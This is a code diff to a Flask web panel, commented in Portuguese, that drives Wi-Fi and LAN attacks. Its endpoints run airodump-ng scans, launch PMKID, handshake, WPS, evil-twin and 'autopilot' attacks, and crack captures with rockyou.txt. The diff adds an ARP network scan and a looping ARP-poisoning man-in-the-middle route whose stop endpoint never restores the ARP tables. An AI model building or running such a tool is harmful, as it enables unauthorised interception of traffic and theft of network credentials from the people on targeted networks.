@@ -6,13 +6,16 @@ import threading
 from datetime import datetime
 from flask import Flask, render_template, request, jsonify
 
+# Importa o núcleo
 import wifi_auditor
 from wifi_auditor import run_command, set_monitor_mode, set_managed_mode, capture_pmkid, capture_handshake, crack_hash, identify_vendor, analyze_vulnerabilities, capture_wps, fix_drivers_wifi6, start_ghost_attack, boost_signal, start_wifite_expert, start_evil_twin, capture_vetor_x, run_autopilot
-from dsi_sniffer import DSISniffer, spoof, restore_arp
+from dsi_sniffer import DSISniffer, spoof, scan_network
 
 app = Flask(__name__)
 
+# Variáveis globais
 CURRENT_MONITOR_IFACE = None
+CURRENT_MANAGED_IFACE = None
 SCAN_PROCESS = None
 CSV_PREFIX = "web_scan_results"
 SESSION_LOGS = []
@@ -49,9 +52,10 @@ def get_interfaces():
 
 @app.route('/api/start_monitor', methods=['POST'])
 def start_monitor():
-    global CURRENT_MONITOR_IFACE
+    global CURRENT_MONITOR_IFACE, CURRENT_MANAGED_IFACE
     iface = request.get_json().get('interface')
     if not iface: return jsonify({"status": "error"}), 400
+    CURRENT_MANAGED_IFACE = iface
     CURRENT_MONITOR_IFACE = set_monitor_mode(iface)
     if CURRENT_MONITOR_IFACE: return jsonify({"status": "success", "monitor_interface": CURRENT_MONITOR_IFACE})
     return jsonify({"status": "error"}), 500
@@ -59,7 +63,7 @@ def start_monitor():
 @app.route('/api/start_scan', methods=['POST'])
 def start_scan():
     global SCAN_PROCESS, CURRENT_MONITOR_IFACE
-    if not CURRENT_MONITOR_IFACE: return jsonify({"status": "error"}), 400
+    if not CURRENT_MONITOR_IFACE: return jsonify({"status": "error", "message": "Não armado."}), 400
     add_log("Varredura Ativa DSI Iniciada.", log_type="cmd", is_command=True)
     run_command(f"rm -f {CSV_PREFIX}-01.*")
     cmd = f"airodump-ng --band abg --output-format csv -w {CSV_PREFIX} --update 1 {CURRENT_MONITOR_IFACE}"
@@ -69,7 +73,8 @@ def start_scan():
 @app.route('/api/stop_scan', methods=['POST'])
 def stop_scan():
     global SCAN_PROCESS
-    if SCAN_PROCESS: SCAN_PROCESS.terminate(); run_command("killall airodump-ng", sudo=True); SCAN_PROCESS = None
+    if SCAN_PROCESS:
+        SCAN_PROCESS.terminate(); run_command("killall airodump-ng", sudo=True); SCAN_PROCESS = None
     return jsonify({"status": "success"})
 
 @app.route('/api/get_networks', methods=['GET'])
@@ -91,6 +96,16 @@ def get_networks():
     networks.sort(key=lambda x: int(x['signal']) if x['signal'].lstrip('-').isdigit() else -100, reverse=True)
     return jsonify({"status": "success", "networks": networks})
 
+@app.route('/api/network/scan', methods=['POST'])
+def api_scan_network():
+    global CURRENT_MANAGED_IFACE, CURRENT_MONITOR_IFACE
+    # O scanner funciona melhor em modo managed e conectado, ou monitor interface se estiver UP
+    iface = CURRENT_MANAGED_IFACE or "wlan0"
+    add_log(f"Iniciando Mapeamento ARP na interface {iface}...", log_type="cmd", is_command=True)
+    devices = scan_network(iface)
+    add_log(f"Mapeamento concluído. {len(devices)} dispositivos identificados.")
+    return jsonify({"status": "success", "devices": devices})
+
 def attack_task(attack_type, bssid, channel, essid, privacy):
     vendor = identify_vendor(bssid)
     _, advice = analyze_vulnerabilities(vendor, essid, privacy)
@@ -101,12 +116,8 @@ def attack_task(attack_type, bssid, channel, essid, privacy):
     if attack_type == 'wps': capture_wps(CURRENT_MONITOR_IFACE, bssid, channel); return
     if attack_type == 'ghost': start_ghost_attack(CURRENT_MONITOR_IFACE, essid); return
     if attack_type == 'wifite': start_wifite_expert(CURRENT_MONITOR_IFACE); return
-    if attack_type == 'autopilot':
-        add_log("ATIVANDO MODO AUTOPILOTO: O sistema assumirá o controle total dos vetores.", log_type="cmd")
-        cap_file = run_autopilot(CURRENT_MONITOR_IFACE, {"essid": essid, "bssid": bssid, "channel": channel})
-    elif attack_type == 'vetorx':
-        add_log("Executando VETOR X (Incursão Total de Última Geração)...")
-        cap_file = capture_vetor_x(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
+    if attack_type == 'autopilot': cap_file = run_autopilot(CURRENT_MONITOR_IFACE, {"essid":essid, "bssid":bssid, "channel":channel})
+    elif attack_type == 'vetorx': cap_file = capture_vetor_x(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
     elif attack_type == 'pmkid':
         cap_file = capture_pmkid(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
         if not cap_file: cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
@@ -114,7 +125,7 @@ def attack_task(attack_type, bssid, channel, essid, privacy):
     if cap_file:
         wordlist = "/usr/share/wordlists/rockyou.txt"
         if os.path.exists(wordlist): crack_hash(cap_file, wordlist, bssid)
-    else: add_log("Alvo impenetrável aos vetores atuais.", log_type="error")
+    else: add_log("Alvo resistiu aos vetores táticos.", log_type="error")
 
 @app.route('/api/attack', methods=['POST'])
 def launch_attack():
@@ -127,7 +138,8 @@ def launch_attack():
 def start_sniff():
     global CURRENT_MONITOR_IFACE, SNIFFER_INSTANCE
     if not SNIFFER_INSTANCE:
-        SNIFFER_INSTANCE = DSISniffer(CURRENT_MONITOR_IFACE or "wlan0", log_callback=add_log)
+        iface = CURRENT_MONITOR_IFACE or "wlan0"
+        SNIFFER_INSTANCE = DSISniffer(iface, log_callback=add_log)
         SNIFFER_INSTANCE.start()
     return jsonify({"status": "success"})
 
@@ -137,6 +149,28 @@ def stop_sniff():
     if SNIFFER_INSTANCE: SNIFFER_INSTANCE.stop(); SNIFFER_INSTANCE = None
     return jsonify({"status": "success"})
 
+@app.route('/api/mitm/start', methods=['POST'])
+def start_mitm():
+    global SPOOF_ACTIVE, CURRENT_MONITOR_IFACE, CURRENT_MANAGED_IFACE
+    data = request.get_json(); target_ip = data.get('target_ip'); gateway_ip = data.get('gateway_ip')
+    if not target_ip or not gateway_ip: return jsonify({"status": "error"}), 400
+    iface = CURRENT_MONITOR_IFACE or CURRENT_MANAGED_IFACE or "wlan0"
+    def run_spoof():
+        global SPOOF_ACTIVE
+        SPOOF_ACTIVE = True
+        add_log(f"Envenenando ARP via {iface}: {target_ip} <-> {gateway_ip}", log_type="cmd", is_command=True)
+        while SPOOF_ACTIVE:
+            if not spoof(target_ip, gateway_ip, iface):
+                add_log("Falha no Spoofing: Dispositivos não respondem.", log_type="error"); break
+            time.sleep(2)
+    threading.Thread(target=run_spoof, daemon=True).start()
+    return jsonify({"status": "success"})
+
+@app.route('/api/mitm/stop', methods=['POST'])
+def stop_mitm():
+    global SPOOF_ACTIVE; SPOOF_ACTIVE = False
+    return jsonify({"status": "success"})
+
 @app.route('/api/fix/wifi6', methods=['POST'])
 def fix_wifi6():
     threading.Thread(target=fix_drivers_wifi6, args=(True,)).start()
@@ -144,7 +178,7 @@ def fix_wifi6():
 
 @app.route('/api/restore', methods=['POST'])
 def restore():
-    global CURRENT_MONITOR_IFACE, SCAN_PROCESS
+    global CURRENT_MONITOR_IFACE, CURRENT_MANAGED_IFACE, SCAN_PROCESS
     if SCAN_PROCESS: SCAN_PROCESS.terminate(); run_command("killall airodump-ng", sudo=True); SCAN_PROCESS = None
     if CURRENT_MONITOR_IFACE: set_managed_mode(CURRENT_MONITOR_IFACE); CURRENT_MONITOR_IFACE = None
     return jsonify({"status": "success"})
